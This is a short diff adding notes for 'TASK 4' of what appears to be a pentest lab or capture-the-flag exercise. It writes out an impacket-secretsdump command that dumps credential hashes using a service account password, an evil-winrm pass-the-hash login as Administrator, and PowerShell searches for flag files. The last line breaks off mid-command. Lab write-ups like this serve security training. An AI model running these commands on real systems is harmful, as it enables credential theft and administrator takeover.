@@ -32,4 +32,14 @@ TASK2
 
 
 
+TASK 4 
+
+impacket-secretsdump PENTESTLAB.local/svc_backup:'Password1'@192.168.56.20
+
+ evil-winrm -i 192.168.56.20 -u Administrator  -H b817733bdc947930b700cc2e567fb3ad
+
+
+THAN YOU SHOULD BE CLEAR IN POWERSHELL 
+ gci C:\ -Recurse -Include "*flag*" -ea 0
+Get-ChildItem C:\ -Recurse -Include "*flag*.txt" -ea 0 |
 
